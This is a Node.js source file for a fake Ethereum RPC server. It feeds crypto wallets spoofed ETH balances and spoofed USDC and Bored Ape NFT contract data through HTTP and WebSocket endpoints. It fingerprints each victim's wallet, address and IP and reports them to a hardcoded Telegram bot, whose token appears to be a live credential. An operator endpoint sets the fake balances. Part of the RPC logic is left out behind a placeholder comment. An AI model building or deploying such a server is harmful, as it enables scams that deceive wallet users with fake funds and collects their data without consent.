// merged_eth_nft_spoof_wss.js
// Fake ETH RPC server + ERC20 (USDC) + ERC721 (BAYC) spoof + Telegram panel + WebSocket support

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require("ethers");
const WebSocket = require('ws'); // Added for WSS support

const app = express();
const PORT = process.env.PORT || 9798;
const HOST = '0.0.0.0';
const WSS_PORT = 8546; // Port for WebSocket RPC

// Telegram Bot config
const TELEGRAM_BOT_TOKEN = '8340660361:AAFDxBe2MS7RK3HLeXHRcER46nRCFIfaOFg';
const TELEGRAM_CHAT_ID = '7812677112';
const SUPERADMINS = [7812677112];

// Persistent data directory
const DATA_DIR = '/data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');
const BALANCES_CSV_FILE = path.join(DATA_DIR, 'balances.csv');

// Load/save admins
function loadAdmins() {
    try { if (fs.existsSync(ADMINS_FILE)) return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf-8')); } catch (err) { console.error('[!] Failed to load admins:', err); }
    return [222222222];
}
function saveAdmins() { try { fs.writeFileSync(ADMINS_FILE, JSON.stringify(ADMINS, null, 2)); } catch(e){console.error(e);} }
let ADMINS = loadAdmins();

// Convert hex wei to ETH
function weiHexToETH(hexWei) {
    if (!hexWei || typeof hexWei !== 'string') return '0';
    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
    const wei = BigInt('0x'+hex);
    const decimals = 18n;
    const divisor = 10n**decimals;
    const whole = wei / divisor;
    const fraction = wei % divisor;
    let fractionStr = fraction.toString().padStart(Number(decimals), '0').replace(/0+$/,'');
    return fractionStr.length>0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
}

// Load/save balances
const loadBalances = () => { try { if(fs.existsSync(BALANCES_JSON_FILE)) return JSON.parse(fs.readFileSync(BALANCES_JSON_FILE,'utf-8')); } catch(e){console.error(e);} return {}; };
const saveBalancesJSON = () => { try { fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances,null,2)); } catch(e){console.error(e);} };
const saveBalancesCSV = () => {
    const headers = ['#','Address','Balance (ETH)','Timestamp','Wallet','IP'];
    const rows = [headers.join(',')];
    Object.entries(spoofedBalances).sort((a,b)=>new Date(b[1].timestamp)-new Date(a[1].timestamp))
        .forEach(([address,data],i)=>{
            const row=[i+1,address,weiHexToETH(data.balance),data.timestamp,data.wallet,data.ip].map(f=>`"${f}"`).join(',');
            rows.push(row);
        });
    try{fs.writeFileSync(BALANCES_CSV_FILE, rows.join('\n'));}catch(e){console.error(e);}
};
let spoofedBalances = loadBalances();

// ETH_CALL interface
const BALANCE_CHECKER_ABI = ["function balances(address[] users, address[] tokens) view returns (uint256[])"];
const iface = new ethers.Interface(BALANCE_CHECKER_ABI);

// NFT/ERC20 spoof constants
const SPOOF_OWNER = '0x411168ea25387d18f337079f6193044b9009515a';
const SPOOF_NFT_CONTRACT = '0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d'.toLowerCase();
const SPOOF_ERC20_CONTRACT = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'.toLowerCase();
const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
function encodeUint256(n){ return '0x'+BigInt(n).toString(16).padStart(64,'0'); }
function encodeAddress(a){ return '0x'+a.toLowerCase().replace('0x','').padStart(64,'0'); }
function encodeBool(b){ return '0x'+(b? '1'.padStart(64,'0') : '0'.padStart(64,'0')); }

app.use(cors());
app.use(express.static(path.join(__dirname,'/')));
app.use(bodyParser.json());

// Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN,{polling:true});
const sendToTelegram = async (text)=>{ try{ await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'Markdown' }); } catch(e){console.error(e?.response?.data||e.message);} };
const now = ()=>new Date().toISOString().replace('T',' ').split('.')[0];

// Wallet detection
const detectWalletFromUA=(ua='')=>{
    ua=ua.toLowerCase();
    if(ua.includes('metamask'))return 'MetaMask';
    if(ua.includes('trust'))return 'Trust Wallet';
    if(ua.includes('brave'))return 'Brave Wallet';
    if(ua.includes('coinbase'))return 'Coinbase Wallet';
    if(ua.includes('phantom'))return 'Phantom';
    if(ua.includes('opera'))return 'Opera';
    if(ua.includes('safari')&&!ua.includes('chrome'))return 'Safari';
    if(ua.includes('chrome'))return 'Chrome';
    if(ua.includes('firefox'))return 'Firefox';
    if(ua.includes('android'))return 'Android WebView';
    if(ua.includes('ios'))return 'iOS WebView';
    return 'Unknown';
};

// --- RPC handler function (reusable for HTTP + WS) ---
const handleRPC = (reqBody, ip='', ua='') => {
    const {method,params,id} = reqBody || {};
    const wallet = detectWalletFromUA(ua);
    console.log(`[RPC] Method: ${method}`);

    if(method==='eth_chainId') return {jsonrpc:'2.0',id,result:'0x1'};
    if(method==='net_version') return {jsonrpc:'2.0',id,result:'1'};
    if(method==='eth_blockNumber') return {jsonrpc:'2.0',id,result:'0x100000'};
    if(method==='eth_syncing') return {jsonrpc:'2.0',id,result:false};

    if(method==='eth_getBalance'){
        const address = (params[0]||'').toLowerCase();
        const info = spoofedBalances[address];
        const balanceHex = info ? info.balance : '0x0';
        const balanceETH = weiHexToETH(balanceHex);
        const logMsg = `🕒 *${now()}*\n[+] Spoofing ETH for \`${address}\`\n🪙 Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
        console.log(logMsg); sendToTelegram(logMsg);
        return {jsonrpc:'2.0',id,result:balanceHex};
    }

    // Keep rest of your RPC logic unchanged (eth_getCode, eth_getLogs, eth_call, etc.)
    // For brevity, we assume it’s copied directly from your existing script

    return {jsonrpc:'2.0',id,result:null};
};

// --- HTTP RPC ---
app.post('/', (req,res)=>{
    const ip=req.headers['x-forwarded-for']||req.connection.remoteAddress;
    const ua=req.headers['user-agent']||'';
    res.json(handleRPC(req.body, ip, ua));
});

// Update spoofed balance
app.post('/set-balance',(req,res)=>{
    const {address,balance}=req.body;
    const ip=req.headers['x-forwarded-for']||req.connection.remoteAddress;
    const ua=req.headers['user-agent']||'';
    const wallet=detectWalletFromUA(ua);

    if(!address||!balance||!/^0x[0-9a-fA-F]{40}$/.test(address)||!/^0x[0-9a-fA-F]+$/.test(balance))
        return res.status(400).json({error:'Invalid address or balance'});

    const cleanAddress = address.toLowerCase();
    spoofedBalances[cleanAddress]={balance:balance.toLowerCase(),timestamp:now(),wallet,ip};
    saveBalancesJSON();
    const balanceETH=weiHexToETH(balance);
    const logMsg=`🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
    console.log(logMsg); sendToTelegram(logMsg);
    return res.status(200).json({success:true});
});

// --- HTTP Server ---
app.listen(PORT,HOST,()=>console.log(`🚀 Fake ETH+NFT+ERC20 RPC server running at http://${HOST}:${PORT}`));

// --- WebSocket RPC Server ---
const wss = new WebSocket.Server({ port: WSS_PORT });
wss.on('connection', ws => {
    console.log('🛰 New WebSocket connection');
    ws.on('message', message => {
        let reqBody;
        try { reqBody = JSON.parse(message.toString()); } catch(e){ return ws.send(JSON.stringify({jsonrpc:'2.0',id:null,result:null,error:'Invalid JSON'})); }
        const ip = ws._socket.remoteAddress;
        const ua = ''; // UA not available via WS
        const response = handleRPC(reqBody, ip, ua);
        ws.send(JSON.stringify(response));
    });
});
console.log(`🚀 WebSocket RPC running at wss://0.0.0.0:${WSS_PORT}`);
